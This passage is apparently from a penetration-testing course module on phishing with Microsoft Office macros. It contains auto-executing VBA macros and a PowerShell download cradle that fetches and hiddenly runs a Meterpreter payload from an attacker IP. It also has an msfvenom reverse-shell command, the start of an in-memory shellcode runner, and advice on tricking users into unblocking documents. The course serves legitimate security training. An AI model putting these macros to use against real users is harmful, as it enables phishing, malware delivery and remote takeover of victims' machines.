# 4. Phishing with Microsoft Office

### 4. Phishing with Microsoft Office

In this Learning Module, we will cover the following Learning Units:

* Microsoft Office Macros
* Executing Shellcode in Word Memory
* PowerShell Shellcode Runner

In 2023, phishing attacks served as an initial vector for [17% of all compromises](https://services.google.com/fh/files/misc/m-trends-2024.pdf). Phishing attacks target client computers, such as workstations or laptops, rather than servers hosting applications. Many of these attacks leverage macros embedded in Microsoft Office products.

In 2022, Microsoft [disabled macros by default](https://learn.microsoft.com/en-us/microsoft-365-apps/security/internet-macros-blocked) in various Office products. Now, when a user opens a document that includes a macro, the application (in this case Word) presents a security warning:

![Figure 1: Microsoft Office 2021 blocks macros](https://static.offsec.com/offsec-courses/PEN-300/imgs/office/281d04255eec280c9740cad731a17de5-blocked.png)

Figure 1: Microsoft Office 2021 blocks macros

However, this protection mechanism was not backported to Office 2016 or 2019, and users are instead given the opportunity to enable macros when opening a Word document containing a macro:

![Figure 2: Microsoft Office 2016/19 blocks macros](https://static.offsec.com/offsec-courses/PEN-300/imgs/office/1ca032f6aa52a0badbcc90422c1eb604-notBlocked.png)

Figure 2: Microsoft Office 2016/19 blocks macros

In this Learning Module we'll investigate macros, demonstrate how attackers develop malicious macros and detail how they leverage them against up-to-date versions of Office.

### 4.1. Microsoft Office Macros

This Learning Unit covers the following Learning Objectives:

1. Installing Microsoft Office
2. Understanding the Basics of VBA
3. Integrating PowerShell

In the following sections we'll get Office set up, write simple Word macros in [Visual Basic for Applications](https://en.wikipedia.org/wiki/Visual_Basic_for_Applications) (VBA), and leverage PowerShell in this context.

### 4.1.1. Installing Microsoft Office

Let's begin by installing Microsoft Office on the Windows 11 victim VM.

First, we'll double-click **C:\installs\Word2021Retail.img** in _File Explorer_. This loads the file as a virtual CD where we can launch **Setup.exe** to begin the installation.

![Figure 3: Microsoft Office 2021 installer](https://static.offsec.com/offsec-courses/PEN-300/imgs/office/2b3319fd4b25ac0f03b3217ec44f935f-installer.png)

Figure 3: Microsoft Office 2021 installer

Once the installation is complete, we'll click _Close_ on the splash screen to exit the installer and open Microsoft Word from the start menu. Once Microsoft Word opens, we can close the popup by clicking the cross in the upper-right corner. This will begin our 7-day free trial.

![Figure 4: Product key popup](https://static.offsec.com/offsec-courses/PEN-300/imgs/office/7bfefe5df1365649e6d741cd605dfd3b-productkey.png)

Figure 4: Product key popup

Next, we must _Accept_ the license agreement.

![Figure 5: Accept license agreement](https://static.offsec.com/offsec-courses/PEN-300/imgs/office/1114312e7af53e79f3336e95012d23ec-license.png)

Figure 5: Accept license agreement

We'll then click _Next_ at the data privacy prompt.

![Figure 6: Data privacy agreement](https://static.offsec.com/offsec-courses/PEN-300/imgs/office/2a0dc4160c4aae0e36c1d311bf0fd212-data.png)

Figure 6: Data privacy agreement

Next, we'll select _Don't send optional data_ and click _Done_.

Now that we've install Microsoft Office (and in particular Microsoft Word), we'll begin to explore VBA and demonstrate how it can be used for client-side code execution.

### Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

\| Name

(Click to sort ascending) |

IP Address

\| | | --- | --- | --- | |

Phishing with Microsoft Office - VM #1

Start **Phishing with Microsoft Office - VM #1** with Kali browser access

\| | |

**Labs**

1. Install Microsoft Word on the Windows 11 client as shown in this section. What is the version number of Word as shown under the _Account_ options?

### 4.1.2. Understanding the Basics of VBA

In this section, we'll discuss the basics of VBA, and explore the embedded security mechanisms of Microsoft Office.

We'll create our first macro, which will include a few conditional statements and message boxes. Then we'll try to run a command prompt from MS Word, with the help of the [Windows Script Host](https://en.wikipedia.org/wiki/Windows_Script_Host).

In this module, we're developing the macro on the victim machine, but during a live penetration test, we would do this on our own development machine, not on a compromised host.

To begin, we'll open Microsoft Word on the Windows 11 victim machine and create a new document. We'll navigate to the _View_ tab and select _Macros_ to access the _Macro_ menu.

![Figure 7: Macros menu in Microsoft Word](https://static.offsec.com/offsec-courses/PEN-300/imgs/office/92be8e482c9b068ac0b2ba379c499a03-macroOpen.png)

Figure 7: Macros menu in Microsoft Word

We must choose the current document from the drop-down menu in the Macros dialog window. In our case, we will choose _Document1 (document)_ to select our unnamed document. If we do not choose this document, our macro will not be saved to the document but rather to our global template.

![Figure 8: Selecting macros in the current document](https://static.offsec.com/offsec-courses/PEN-300/imgs/office/b92721d317603e4bff71bb00e1b1d3ac-macroSelect.png)

Figure 8: Selecting macros in the current document

After selecting the current document, we'll enter a name for the macro. In this example, we'll name the macro "MyMacro" and then select _Create_. This will launch the VBA editor where we can run and debug the code.

![Figure 9: VBA editor in Microsoft Word](https://static.offsec.com/offsec-courses/PEN-300/imgs/office/8ee14272d1a515f96e7467369d46f01c-macroEditor.png)

Figure 9: VBA editor in Microsoft Word

The editor inserted a small starting code segment. In this code segment, [_Sub MyMacro_](https://www.excel-easy.com/vba/function-sub.html) defines the beginning of a _MyMacro_ method and _End Sub_ ends the method. Note that in VBA, a method cannot return values to its caller, but a _Function_ (bracketed with keywords like _Function MyMacro_ and _End Function_) can.

As with many other languages, VBA requires that we declare variables before we use them. We can do this with the [_Dim_](https://docs.microsoft.com/en-us/dotnet/visual-basic/language-reference/statements/dim-statement) keyword, supplying the name of the variable and its [datatype](https://docs.microsoft.com/en-us/dotnet/visual-basic/language-reference/data-types/):

Listing 1 shows how some different data types are declared.

```
Dim myString As String
Dim myLong As Long
Dim myPointer As LongPtr
```

> Listing 1 - Declaring variables of different types in VBA

In this example, we used three very common data types: String, Long, and LongPtr. These data types directly translate to a [Unicode](https://en.wikipedia.org/wiki/Unicode) string, a 64-bit integer, and a memory pointer, respectively. These represent the operating system's native data types and are commonly used in languages such as C or C++.

Now that we know how to declare variables, we can use and manipulate them with flow statements. These include the [_If_ and _Else_ statements](https://docs.microsoft.com/en-us/office/vba/language/concepts/getting-started/using-ifthenelse-statements) as illustrated in Listing 2 and the [_For_ loop](https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/fornext-statement). Let's explore these in more detail.

The _If_ and _Else_ statements are complimented by the _Then_ and _End If_ keywords to generate a complete branching statement. When an _If_ condition is met, the _Then_ condition is executed, otherwise the _Else_ condition is executed. Once all conditions are evaluated, the _End If_ statement exits the branching condition.

In the example below, we'll have our macro check the value of a variable and based on the result, display the appropriate built-in [_MsgBox_](https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/msgbox-function) function.

```
Sub MyMacro()

Dim myLong As Long

myLong = 1

If myLong < 5 Then
    MsgBox ("True")
Else
    MsgBox ("False")
End If

End Sub
```

> Listing 2 - If and Else statements in VBA

To execute the macro we either click _Run Macro_ or press %.

![Figure 10: Run Macro button](https://static.offsec.com/offsec-courses/PEN-300/imgs/csceo/5b6f91acbf2ed6c9cd586b3bc5509e9f-csceo_run_macro.png)

Figure 10: Run Macro button

This macro will display a "True" message box since the _myLong_ variable is less than five.

Next, we'll explore the _For_ loop, which increments a counter through the _Next_ keyword:

```
Sub MyMacro()

For counter = 1 To 3
    MsgBox ("Alert")
Next counter

End Sub
```

> Listing 3 - For loop in VBA

The _For_ loop will read the _counter_ three times and each time it reaches the _Next_ keyword, it will increment the value of _counter_ by one. The execution of this macro will present three "Alert" message boxes.

Now that we have briefly discussed custom methods and statements, let's turn our attention to our ultimate goal: making the victim execute our custom macro. Since our victim will likely not do this willingly, we'll need to leverage existing methods like [_Document\_Open()_](https://docs.microsoft.com/en-us/office/vba/api/word.document.open) and [_AutoOpen()_](https://docs.microsoft.com/en-us/office/vba/word/concepts/customizing-word/auto-macros), both of which will execute when the Word document is opened.

VBA implementations may vary across the various Office applications. For example, _Document\_Open()_ is called _Workbook\_Open()_ in Excel.

To use these methods, we must save our document in a [Macro-Enabled file format](https://docs.microsoft.com/en-us/deployoffice/compat/office-file-format-reference) such as **.doc** or **.docm**. The newer **.docx** file format does not support macros.

Let's test this with a simple macro that uses both _Document\_Open_ and _AutoOpen_ for redundancy.

```
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    MsgBox ("This is a macro test")
End Sub
```

> Listing 4 - Simple Word Macro that automatically executes

We'll save the document in the legacy **.doc** format (also referred to as a _Word 97-2003 Document_) and close it.

Now that we've saved the document, let's open it again. This presents a security warning banner instead of our message box output:

![Figure 11: Macro security warning in Microsoft Word](https://static.offsec.com/offsec-courses/PEN-300/imgs/office/db5b4da4439da576a91ea80507c34038-macroEnable.png)

Figure 11: Macro security warning in Microsoft Word

If we click _Enable Content_, the macro will execute and the message box will appear. This is the default security setting for any Office application. When we launch this client-side attack, we must somehow persuade the victim to both open the document and enable the macro.

We can inspect these security settings by navigating to _File_ > _Options_

> _Trust Center_ and opening _Trust Center Settings_:

![Figure 12: Trust Center in Microsoft Word](https://static.offsec.com/offsec-courses/PEN-300/imgs/office/5a5907fe4ea481448324ca3316b12a87-macro_trust.png)

Figure 12: Trust Center in Microsoft Word

Within _Trust Center_, the default security setting is to "Disable all macros with notification":

![Figure 13: Macro Settings in Trust Center](https://static.offsec.com/offsec-courses/PEN-300/imgs/office/43f9fe4bcef9d5c39c18ce7e22e5b694-macro_trust_settings.png)

Figure 13: Macro Settings in Trust Center

The _Protected View_ options describe a sandbox feature introduced in Microsoft Office 2010 that is enabled when documents originate from the Internet.

![Figure 14: Protected View in Trust Center](https://static.offsec.com/offsec-courses/PEN-300/imgs/office/40b2b2de87d310937b8dec72db990c5f-macro_protview_setting.png)

Figure 14: Protected View in Trust Center

When Protected View is enabled, macros are disabled, external images are blocked, and the user is presented with an additional warning message:

![Figure 15: Protected View security warning in Microsoft Word](https://static.offsec.com/offsec-courses/PEN-300/imgs/office/46f4a527ff049023005804451460fbe7-macro_protview.png)

Figure 15: Protected View security warning in Microsoft Word

In addition, macros will be disabled in all documents opened with Office 2021 (and newer) and Office 365 when they are downloaded from the Internet. This means that even if we somehow manage to convince the victim to click _Enable Editing_, the macros still won't execute. This seems like decent protection against macro-based threats and it has reduced the use of Office documents in phishing campaigns. However, attackers can still trick the user into allowing macros to run. One approach is to make the Office document appear as if it were not downloaded from the Internet.

Office uses the [Mark of the Web](https://en.wikipedia.org/wiki/Mark_of_the_Web) (MoTW) attribute to detect if a document originates from the Internet. This is set when a document is downloaded from the Internet.

We can view the MoTW attribute by inspecting the Word document's properties:

![Figure 16: Mark of the Web on a Word document](https://static.offsec.com/offsec-courses/PEN-300/imgs/office/51316a2efc24197325912afccef0dd9a-unblock.png)

Figure 16: Mark of the Web on a Word document

If we check _Unblock_ and click _Apply_, the MoTW attribute is unset and the Word document would be treated as a locally-created file. This disables Protected View and allows macros to run.

This requires attackers to provide a convincing pretext to trick the user into unblocking the document and remove the Mark of the Web before opening the document.

Before wrapping up this section, let's show how to launch an external command, like **cmd.exe**, from VBA. This will serve as a foundation for other techniques we will use in the rest of the course.

The first and simplest technique leverages the VBA [_Shell_](https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/shell-function) function, which takes two arguments. The first argument is the path and name of the application to launch along with any arguments. The second is the _WindowStyle_, which sets the program's window style. Most attackers set this to _vbHide_ (or its numerical equivalent _0_), which hides the program's window.

For example, this code will launch a command prompt in a hidden window after the victim enables macros:

```
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "cmd.exe"
    Shell str, vbHide
End Sub
```

> Listing 5 - Macro to execute cmd from the Shell method

Saving the macro and reopening the Word document will run the macro without any security warnings, because we already enabled the macros on this document. If we rename the document, the security warning will reappear.

Since the command prompt was opened as a hidden window, it is not displayed, but we can verify that it is running. Let's try that now.

We'll run [SysInternals _Process Explorer_](https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer), which we've already installed as **C:\Tools\procexp64**. If we're running it for the first time, we'll click the EULA to continue.

![Figure 17: Cmd.exe as child process of Microsoft Word](https://static.offsec.com/offsec-courses/PEN-300/imgs/office/e44d6e8a182b6a7400266d3878c2fd2c-macro_shell.png)

Figure 17: Cmd.exe as child process of Microsoft Word

This lists information about the processes that are running on the system, the DLLs the processes have loaded, and clearly shows **cmd.exe** running as a child process of **WINWORD.EXE**.

We can also use _Windows Script Host_ to launch a shell. To do this, we'll invoke the [_CreateObject_](https://ss64.com/vb/createobject.html) method to create a WSH shell, and from there we can call the [_Run_](https://ss64.com/vb/run.html) method. While this might sound complicated, the code is relatively simple:

```
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "cmd.exe"
    CreateObject("Wscript.Shell").Run str, 0
End Sub
```

> Listing 6 - Macro execute cmd from Windows Script Host

In this code, the call to _CreateObject_ returns the WSH object, from which we invoke the _Run_ method, supplying the path and name of the application to execute along with the _vbHide_ window style (0). Executing the Macro will once again open **cmd.exe** as a hidden process, which we can again verify with Process Explorer.

In this section we learned the basics of VBA and Microsoft Office macros. We discussed the _If_ statement and _For_ loops. We examined the Trust Center and discussed the file extensions that support macros. We also briefly discussed how we can use VBA to execute other applications. In the next section, we'll build upon this to learn how to execute Meterpreter shellcode.

### Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Phishing with Microsoft Office - VM #2

**Labs**

1. Create a Word document and insert the VBA code shown in the Listing below. Figure out what the code does and identify the error in the code. After correcting the error, run the VBA macro. Enter the result.

```
Sub MyMacro()

Dim value As Long
Dim result As Long

value = 5
result = 7

For counter = 1 To value
    result = result + value + 32
Next counterr

If result < 180 Then
    MsgBox ("True")
Else
    MsgBox ("False")
End If

End Sub
```

2. Create a VBA macro that prints the current username and computer name in a prompt using the _Environ>_ function. The result should be in the format _username ||computername_.
3. Download **C:\Tools\safe.doc** to your Kali box. Change the name of the Word document and host it on your Kali box with a Python web server. Download it to the Windows 11 box and validate that the Mark of the Web attribute is set.

Clear the Mark of the Web attribute on the Word document and open it. Enable macros. What is the output in the alert box?

### 4.1.3. Integrating PowerShell

So far, we have focused on Microsoft Office and discussed the basic mechanics of VBA macros. Next, we'll leverage the extremely powerful and flexible PowerShell environment to improve the attack.

As discussed in the previous section, VBA is a type-based compiled language. PowerShell, on the other hand, is an object-oriented scripting language. It is compiled and executed on-the-fly through the .NET framework. It generally does not use types and offers more flexibility than VBA. Let's discuss the basics of PowerShell before we implement it in a phishing attack.

To declare a variable in PowerShell, we'll simply supply the dollar sign ($) before a variable name. PowerShell control logic, including branching statements and loops, uses a syntax that is similar to most other scripting languages. The biggest syntactical difference is in [comparisons](https://ss64.com/ps/syntax-compare.html). PowerShell does not use the typical _==_ or _!=_ syntax but instead uses _-eq_, _-ne_, and similar.

Since PowerShell has access to the .NET framework, we can easily implement specialized techniques such as download cradles to download content (like second stage payloads) from external web servers. The most commonly-used variant is the [_Net.WebClient_ class](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-8.0). By instantiating an object from this class, we can call the [DownloadFile method](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-8.0) to download any file from a web server to the victim.

In the following example, we'll invoke the _DownloadFile_ method. We'll assemble a full script, then reduce it to a single one-liner.

_DownloadFile_ takes two arguments: the URL of the file to be downloaded and the output filename. The entire download procedure can be written in just four lines of PowerShell:

```
$url = "http://192.168.119.120/msfstaged.exe"
$out = "msfstaged.exe"
$wc = New-Object Net.WebClient
$wc.DownloadFile($url, $out)
```

> Listing 7 - PowerShell code to download Meterpreter executable

In this code listing, we created a variable for the file we want to download, then a variable for the name of the local file. Next, we instantiated the _Net.WebClient_ class to create a download cradle from which we then invoke the _DownloadFile_ method to download the file. In this case, we used the same staged Meterpreter executable we created earlier.

We can compress this into a single one-liner:

```
(New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/msfstaged.exe', 'msfstaged.exe')
```

> Listing 8 - PowerShell one-liner to download Meterpreter executable

Let's embed this into our Word macro using VBA and have PowerShell do the heavy lifting for us. We will slowly build it here, piece by piece, and then review the completed code.

Most PowerShell download cradles use HTTP or HTTPS, but we could use [TXT records](https://en.wikipedia.org/wiki/TXT_record) and a [DNS transport](https://github.com/evilmog/evilmog/wiki/DNS-Download-Cradle) instead.

As an overview, we'll set up a download cradle by converting our PowerShell string to work in VBA. We'll wait for the file to download and then execute the file.

Let's start writing our VBA code. The first step is to declare our string variable and fill that string with the PowerShell download cradle code. Next, we'll use the _Shell_ method to start PowerShell with the one-liner as an argument. We'll then instruct the _Shell_ method to run the code and hide the output from the user.

This code segment will download the file to the victim's machine:

```
Dim str As String
str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/msfstaged.exe', 'msfstaged.exe')"
Shell str, vbHide
```

> Listing 9 - VBA code to invoke the PowerShell download cradle

Before executing this code, we must place the Meterpreter executable (**msfstaged.exe**) on our Kali web server along with a multi/handler listener.

To execute the Meterpreter executable through VBA, we must specify the full path. Luckily, downloaded content will end up in the current folder of the Word document and we can obtain the path name with the [_ActiveDocument.Path_](https://docs.microsoft.com/en-us/office/vba/api/word.document.path) property:

```
Dim exePath As String
exePath = ActiveDocument.Path & "\" & "msfstaged.exe"
```

> Listing 10 - Getting file path from ActiveDocument.Path

Since we are downloading the Meterpreter executable from a web server and the download time may vary, we must introduce a time delay. Unfortunately, Microsoft Word does not have a _Wait_ or _Sleep_ VBA function like Excel, so we'll implement a custom _Wait_ method using a [_Do_ loop](https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/doloop-statement) along with the [_Now_](https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/now-function) and [_DateAdd_](https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/dateadd-function) functions.

This will allow us to pass a _Wait_ parameter (measured in seconds) to pause the execution. To ensure that our _Wait_ procedure does not block Microsoft Word, each iteration calls [_DoEvents_](https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/doevents-function) allowing Word to process other actions.

To do this, we'll retrieve the current date and time with the _Now_ function and save it to the _t_ variable. Then we'll use a _Do_ loop, which will work through the comparison declared in the _Loop Until_ statement.

```
Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub
```

> Listing 11 - VBA wait method using dates

This code will continue to loop until the comparison is true, which happens when the current time (returned by _Now_) is greater than the time returned by the _DateAdd_ function. This function takes three arguments: a string expression that represents the interval of time (_s_), the number of seconds to wait (_n_), and the current time (_t_).

Simply stated, _n_ seconds are added to the time the loop starts and the result is compared to the current time. Once _n_ seconds have passed, the loop completes.

With our _Wait_ method implemented, we just need to invoke it and then execute the Meterpreter executable. To do that, we'll again use the _Shell_ function and call the _exePath_ we created.

Here's the complete VBA macro:

```
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/msfstaged.exe', 'msfstaged.exe')"
    Shell str, vbHide
    Dim exePath As String
    exePath = ActiveDocument.Path & "\" & "msfstaged.exe"
    Wait (2)
    Shell exePath, vbHide

End Sub

Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub
```

> Listing 12 - Complete VBA macro to download Meterpreter executable and execute it

Let's review what we did. We built a Word document. When the document is opened, and macros are enabled, our code pulls the Meterpreter executable from our web server. We added a small time delay to allow the file to completely download. Finally, we executed our payload (which is hidden from the user) which results in a reverse Meterpreter shell.

### Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Phishing with Microsoft Office - VM #3

**Labs**

1. In PowerShell on Windows 11, which PowerShell cmdlet is invoked when the commonly-used Linux command curl is invoked?
2. We can also use the PowerShell [_Invoke-WebRequest_](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.4) cmdlet to download a file from a web server in a simple one-liner. Develop a download cradle inside a Word macro using Invoke-WebRequest. What is the name of the parameter that stores the file?

### 4.2. Executing Shellcode in Word Memory

This Learning Unit covers the following Learning Objectives:

1. Calling Win32 APIs from VBA
2. Implementing a VBA Shellcode Runner

We've successfully written and executed a Word macro which downloads a Meterpreter executable to the hard drive and executes it. There are a few drawbacks to this approach. First, the downloaded executable may be flagged by network monitoring software or host-based network monitoring. In addition, we are storing the executable on the hard drive, which may trigger local antivirus software.

In this section, we'll improve our tradecraft by modifying our attack to execute the staged Meterpreter payload directly in memory. This will be a slow process, but we will learn valuable techniques along the way.

This concept exceeds the limits of VBA. This is partly due to the fact that the staged Meterpreter payload is actually pure assembly code that must be placed in a memory location and executed. Instead of using pure VBA, we can leverage native [Windows operating system APIs](https://docs.microsoft.com/en-us/dotnet/visual-basic/programming-guide/com-interop/walkthrough-calling-windows-apis) within VBA.

### 4.2.1. Calling Win32 APIs from VBA

Windows operating system APIs (or _Win32 APIs_) are located in dynamic link libraries and run as unmanaged code. We'll use the [_Declare_](https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/declare-statement) keyword to link to these APIs in VBA, providing the name of the function, the DLL it resides in, the argument types, and return value types. We will use a _Private Declare_, meaning that this function will only be used in our local code.

In this example, we'll use the [_GetUserName_](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getusernamea) API. We will build our _Declare_ function statement, and display the username in a popup with _MsgBox_. We can reference the function prototype from the official MSDN documentation, which tells us the maximum size of the username, along with the DLL it resides in (**Advapi32.dll**). We can expand on that to declare the function we want.

```
BOOL GetUserNameA(
  LPSTR   lpBuffer,
  LPDWORD pcbBuffer
);
```

> Listing 13 - Function prototype of GetUserName

MSDN describes the function arguments as native C types and we must translate these to their corresponding VBA data types. The first argument is an output buffer of C type _LPSTR_ which will contain the current username. It can be supplied as a _String_ in VBA.

Working out the conversion between [C data types](https://docs.microsoft.com/en-us/windows/win32/winprog/windows-data-types) and [VBA data types](https://docs.microsoft.com/en-us/dotnet/visual-basic/language-reference/data-types/) can be tricky. MSDN references some comparisons, but there's very little official documentation.

In C, the _LPSTR_ is a pointer to a string. Similarly, the VBA _String_ object holds the pointer to a string, rather than the string itself. For this reason we can pass our [argument by value](https://docs.microsoft.com/en-us/dotnet/visual-basic/language-reference/modifiers/byval) with _ByVal_, since the expected types match.

The second argument given in the function prototype (_pcbBuffer_) as a C type is a pointer or reference to a DWORD (_LPDWORD_). It is the maximum size of the buffer that will contain the string. We may substitute that with the VBA _Long_ data type and [pass it by reference](https://docs.microsoft.com/en-us/dotnet/visual-basic/language-reference/modifiers/byref) (_ByRef_) to obtain a pointer in VBA. Finally, the output type in C is a boolean (_BOOL GetUserNameA_), which we can translate into a _Long_ in VBA.

Now that we have explained all the components, let's put everything together. We'll import our target function using _Private Declare_ and supply the Windows API name and its DLL location, along with our arguments. When working on 64-bit we must also supply the [_PtrSafe_ keyword](https://learn.microsoft.com/en-us/office/vba/language/reference/user-interface-help/declare-statement) The final _Declare_ statement is given below. It must be placed outside the procedure.

```
Private Declare PtrSafe Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, ByRef nSize As Long) As Long
```

> Listing 14 - Declaring and importing the GetUserNameA Win32 API

With the function imported, we must declare three variables: the return value, the output buffer, and the size of the output buffer. As specified on MSDN, the maximum allowed length of a username is 256 characters so we'll create a 256-byte String, _MyBuff_, and _MySize_ as a Long and set it to 256.

```
Function MyMacro()
  Dim res As Long
  Dim MyBuff As String * 256
  Dim MySize As Long
  MySize = 256
  
  res = GetUserName(MyBuff, MySize)
End Function
```

> Listing 15 - Setting up arguments and calling GetUserNameA

Before we can print the result, recall that _MyBuff_ can contain up to 256 characters, but we do not know the length of the actual username. Since a C string is terminated by a null byte, we'll use the [InStr function](https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/instr-function) function to get the index of a null byte terminator in the buffer, which marks the end of the string.

The arguments for _InStr_ are fairly straightforward. We'll define the starting location (setting it to "1" for the beginning of the string), the string to search, and the search character (null byte). This will return the location of the first null byte, and we can subtract one from this number to get the string length.

```
Function MyMacro()
  Dim res As Long
  Dim MyBuff As String * 256
  Dim MySize As Long
  Dim strlen As Long
  MySize = 256
  
  res = GetUserName(MyBuff, MySize)
  strlen = InStr(1, MyBuff, vbNullChar) - 1
  MsgBox Left$(MyBuff, strlen)
End Function
```

> Listing 16 - Returning the result from GetUserNameA

Now that we have the length of the string, we'll print the non-null characters with the [_Left_ method](https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/left-function) method as shown in the last highlighted line of Listing 16. _Left_ creates a substring of its first argument with the size of its second argument.

If we've called the Win32 API correctly, the macro will display the desired username with no trailing spaces:

![Figure 18: MessageBox containing the username obtained through GetUserName](https://static.offsec.com/offsec-courses/PEN-300/imgs/office/9305788e360f67f0900bf8b15c11f44e-vba_inmem_username.png)

Figure 18: MessageBox containing the username obtained through GetUserName

While this is obviously only a proof of concept, it shows that we can call arbitrary Win32 APIs directly from VBA, which is required if we want to execute shellcode from memory.

### Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Phishing with Microsoft Office - VM #4

**Labs**

1. Develop a VBA macro that calls the Win32 API [_GetPhysicallyInstalledSystemMemory_](https://learn.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-getphysicallyinstalledsystemmemory) and displays the result in a message box. What is the result?

### 4.2.2. VBA Shellcode Runner

Next, let's investigate a _shellcode runner_, a piece of code that executes shellcode in memory. We'll build this in VBA.

The typical approach is to use three Win32 APIs from Kernel32.dll: _VirtualAlloc_, _RtlMoveMemory_, and _CreateThread_.

We will use _VirtualAlloc_ to allocate unmanaged memory that is writable, readable, and executable. We'll then copy the shellcode into the newly-allocated memory with _RtlMoveMemory_, and create a new execution thread in the process through _CreateThread_ to execute the shellcode. Let's inspect each of these Win32 APIs and reproduce them in VBA.

Allocating memory through other Win32 APIs returns non-executable memory because of [Data Execution Prevention](https://docs.microsoft.com/en-us/windows/win32/memory/data-execution-prevention) (_DEP_).

We'll take one API at a time, starting with [_VirtualAlloc_](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc). MSDN describes the following function prototype for _VirtualAlloc_:

```
LPVOID VirtualAlloc(
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flAllocationType,
  DWORD  flProtect
);
```

> Listing 17 - Function prototype for VirtualAlloc

This API accepts four arguments. The first, _lpAddress_, is the memory allocation address. If we leave this set to "0", the API will choose the location. The _dwSize_ argument indicates the size of the allocation. Finally, _flAllocationType_ and _flProtect_ indicate the allocation type and the memory protections, which we will come back to.

The first argument and the return value are memory pointers that can be represented by _LongPtr_ in VBA. The remaining three arguments are integers and can be translated to _Long_.

Let's declare these arguments in our first _Declare_ statement as shown in Listing 18.

```
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
```

> Listing 18 - Function declaration for VirtualAlloc

Now that we have our _Declare_ statement, we need to figure out some of the values we need. Since we don't yet know the size of our shellcode, let's generate it first.

In order to generate the shellcode, we need to know the target architecture. Obviously we are targeting a 64-bit Windows machine, and while newer versions of Microsoft Word like 365 and 2021 are 64-bit applications, older versions like 2016 run as 32-bit. In our case we will generate a 64-bit Meterpreter shellcode.

We'll use **msfvenom** to a generate shellcode formatted as _vbapplication_, as the first stage of a Meterpreter shell.

Since we'll be executing our shellcode inside Word, we'll set _EXITFUNC_ to "thread" (instead of the default value of "process") so that Word won't close when the shellcode exits.

```
kali@kali:~$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f vbapplication
...
Payload size: 793 bytes
Final size of vbapplication file: 2655 bytes
buf = Array(252,72,131,228,240,232,204,0,0,0,65,81,65,80,82,72,49,210,81,101,72,
...
06,0,89,187,224,29,42,10,65,137,218,255,213)

```

> Listing 19 - Generate shellcode in vbapplication format

We'll add this array to our VBA code.

Next, we'll set the arguments for _VirtualAlloc_. The MSDN documentation suggests that we should set supply _lpAddress_ to "0", which will leave the memory allocation to the API. For the second argument, _dwSize_, we could hardcode the size of our shellcode based on the output from msfvenom, but it's better to set it dynamically. This way, if we change our payload, we won't have to change this value. We'll use the [_UBound_ function](https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/ubound-function) to get the size of the array (_buf_) containing the shellcode.

For the third argument, we will use 0x3000, which equates to the [allocation type enums](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex) of _MEM\_COMMIT_ and _MEM\_RESERVE_. This will make the operating system allocate the desired memory for us and make it available. In VBA, this hex notation will be represented as _\&H3000_.

We'll set the last argument to \&H40 (0x40), indicating that the memory is readable, writable, and executable.

Our complete _VirtualAlloc_ call is shown in Listing 20. Note that the Meterpreter array stored in _buf_ has been truncated for ease of display.

```
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr

...

Dim buf As Variant
Dim addr As LongPtr

buf = Array(252,72,131,228,240,232...

addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
```

> Listing 20 - Calling VirtualAlloc from VBA

Now that we've allocated memory with _VirtualAlloc_, we must copy the shellcode bytes into this memory location. This is done using the [_RtlMoveMemory_ function](https://docs.microsoft.com/en-us/windows/win32/devnotes/rtlmovememory). MSDN describes this function prototype as:

```
VOID RtlMoveMemory(
  VOID UNALIGNED *Destination,
  VOID UNALIGNED *Source,
  SIZE_T         Length
);
```

> Listing 21 - RtlMoveMemory function prototype

